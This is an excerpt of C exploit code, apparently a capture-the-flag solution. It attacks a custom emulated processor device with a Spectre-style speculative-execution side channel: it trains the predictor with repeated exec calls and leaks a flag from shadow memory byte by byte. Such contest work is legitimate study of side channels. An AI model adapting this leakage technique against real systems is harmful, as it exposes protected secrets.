...
void prep_mem_state(struct instruction_t *code, int ypu_fd) {
    // start after header
    int ip = 2;
    ...
    sys_read(code, &ip, 0, 0, 55, SPEC_REG_D); // read flag into shadow mem

    // need to store a value corresponding to an invalid header into mem[ds:128][mem:0] for later execs
    code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_DS, .arg2 = 128 };
    code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = 1 };
    code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_B, .arg2 = 0 };
    code[ip++] = (struct instruction_t){ .op = INST_STM, .arg1 = SPEC_REG_B, .arg2 = SPEC_REG_A };

    // crashing inst: invalid register, could be subbed for a sys_exit
    code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = 0x5, .arg2 = 0x5 };

    // flag will get read and header value will be stored and persist
...
void leak_byte(struct instruction_t *code, int ypu_fd, char* leaked, int bidx) {
    ...
    // set ds to 128 to prepare for OOB leakage
    code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_DS, .arg2 = 128 };

    for (int i = 0; i < 10; i++) {
        code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = 0 };

        // use exec for training
        // the number of these is fairly arbitrary, it almost works with even just one
        code[ip++] = (struct instruction_t){ .op = INST_SYS, .arg1 = SYS_EXEC, .arg2 = SPEC_REG_D };
        code[ip++] = (struct instruction_t){ .op = INST_SYS, .arg1 = SYS_EXEC, .arg2 = SPEC_REG_D };
        code[ip++] = (struct instruction_t){ .op = INST_SYS, .arg1 = SYS_EXEC, .arg2 = SPEC_REG_D };
        code[ip++] = (struct instruction_t){ .op = INST_SYS, .arg1 = SYS_EXEC, .arg2 = SPEC_REG_D };
        code[ip++] = (struct instruction_t){ .op = INST_SYS, .arg1 = SYS_EXEC, .arg2 = SPEC_REG_D };
        ...
        // speculative exec should occur on open
        // causing code[memory[2*(reg_ds * PAGE_SIZE) + reg_a] * PAGE_SIZE]
        // leaking the value at memory[ds:256][reg_a] aka shadow[ds:0][reg_a] to us

        sys_open(code, &ip, bidx, 0, 0, SPEC_REG_A);
        code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = 0x5, .arg2 = 0x5 };
...
int main() {
    ...
    // perform one-time memory tasks
    prep_mem_state(code, ypu_fd);
